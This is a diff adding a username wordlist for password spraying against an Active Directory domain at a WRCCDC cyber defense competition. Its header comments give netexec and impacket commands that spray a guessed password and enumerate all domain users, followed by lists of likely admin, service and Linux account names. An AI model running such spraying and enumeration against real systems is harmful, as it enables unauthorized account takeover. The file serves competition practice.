@@ -1,0 +1,65 @@
+# WRCCDC Regionals 2026 — Quals Carry-Over Username List
+# Theme: Water / Hydration (domain: rmwpra.hydration)
+# AD Username format: FIRSTNAME_LASTNAME (all caps, underscore separator)
+# Confidence: HIGH for format; UNKNOWN for actual names (roster not available pre-competition)
+#
+# Usage:
+#   netexec smb <dc-ip> -u /path/to/this/file -p 'WaterIsWet??' --no-bruteforce --continue-on-success
+#   impacket-GetADUsers -all rmwpra.hydration/Administrator:'WaterIsWet??'@<dc-ip>  ← get real list once in
+#
+# NOTE: Get the REAL username list from AD as fast as possible after any DC access.
+# This file covers service accounts and common admin patterns only — not actual team rosters.
+# Priority: enumerate AD users via GetADUsers immediately on any DC access, then spray that list.
+
+# --- Service / admin accounts (highest spray priority) ---
+Administrator
+admin
+administrator
+root
+sysadmin
+SVC_admin
+service
+backup
+Guest
+
+# --- Common CCDC AD admin naming patterns ---
+# (these are guesses — replace with real AD users once enumerated)
+DOMAIN_ADMIN
+SYSADMIN
+BACKUP_ADMIN
+IT_ADMIN
+NETWORK_ADMIN
+HELP_DESK
+SERVICE_ACCOUNT
+
+# --- Hydration-theme character name patterns (FIRSTNAME_LASTNAME format) ---
+# WRCCDC themes often use names related to the theme; water/hydration theme candidates:
+AQUA_ADMIN
+WATER_ADMIN
+H2O_ADMIN
+FLOW_ADMIN
+SPRING_ADMIN
+RAIN_ADMIN
+HYDRA_ADMIN
+
+# --- Common first name + last name patterns in CCDC (replace with real roster) ---
+# Format template: FIRSTNAME_LASTNAME (all caps)
+# Example real users from quals PCAP analysis would go here once extracted
+# JOHN_SMITH
+# JANE_DOE
+# etc.
+
+# --- Linux/service usernames ---
+root
+ubuntu
+kali
+vagrant
+ansible
+deploy
+git
+www-data
+apache
+nginx
+postgres
+mysql
+tomcat
